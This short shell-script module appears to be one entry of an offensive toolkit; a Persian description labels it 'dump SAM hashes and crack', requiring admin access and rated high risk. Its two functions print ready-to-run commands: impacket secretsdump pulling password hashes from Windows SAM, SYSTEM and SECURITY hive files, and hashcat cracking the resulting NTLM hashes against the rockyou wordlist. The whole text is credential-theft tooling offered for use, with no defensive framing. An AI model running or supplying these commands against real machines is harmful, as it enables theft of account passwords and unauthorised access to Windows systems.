DESC="dump هش‌های SAM و کرک"
REQ="دسترسی ادمین"
RISK="HIGH"

termux(){ echo "python3 secretsdump.py -sam sam.hiv -system sys.hiv LOCAL"; }

kali(){
cat <<'EOF'
impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
EOF
}
